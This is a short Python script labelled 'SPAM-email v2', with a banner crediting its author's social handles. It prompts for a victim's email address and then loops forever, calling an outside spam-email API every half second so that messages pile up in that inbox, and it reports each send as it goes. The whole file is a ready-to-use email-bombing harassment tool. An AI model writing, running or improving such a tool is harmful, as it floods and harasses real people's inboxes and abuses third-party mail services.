# -*- coding: utf-8 -*-
#script by : @os74o

try:
	import os,requests,time
	
except:
	os.system('pip install -requests&&pip install time&&clear ')
	
from requests import (post,get)
from time import sleep
#colors=[]
R="\033[1;31m"# Red
G="\033[1;32m" # Green
Y="\033[1;33m"# Yellow
B="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
h=C

os74 = f'''{h}
{W} .d88888b.   .d8888b.  
{h}d88P" "Y88b d88P  Y88b 
{W}888     888 Y88b.      
{h}888     888  "Y888b.   
{W}888     888     "Y88b. 
{h}888     888       "888 
{W}Y88b. .d88P Y88b  d88P 
{h} "Y88888P"   "Y8888P"           
  
                                         
{W}[ {h}SPAM-email v2{W} ]
{W}--------------------------
{W}|{W}[ {h}Author {W}] : {h}@OS74O{W}     |
|{W}[ {h}Tele {W}] : {h}@OS74_Tools{W}  |
|{W}[{h} YT{W} ]   : {h} @OSAMA74{W}    |
|{W}[{h} Github{W} ] : {h} @OS74O{W}    |
{W}--------------------------
'''
print             ((((((((((((os74))))))))))))
print()
email = input(C+f' [{W}email{C}] => {W}')
	
#headers={'Host':'dev-osama74.pantheonsite.io','content-type':'application/json; charset=utf-8','user-agent':'Mozilla/5.0 (Linux; Android 9; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36'}

url = 'https://dev-osama74.pantheonsite.io/api/spam-email/?email='+email
print()
def spam():
    	sleep(0.5)
    	req=get(url).text
    	if 'true' not in req:
    		status2={'status':'not sent','error':'request error'}
    		print(R+str(status2)+W)
    	elif 'true' in req:
 	   	sleep(0.01)
 	   	status={'status':'sent','email':email}
 	   	print(G+str(status)+W)
 	   	
while True:
	spam()
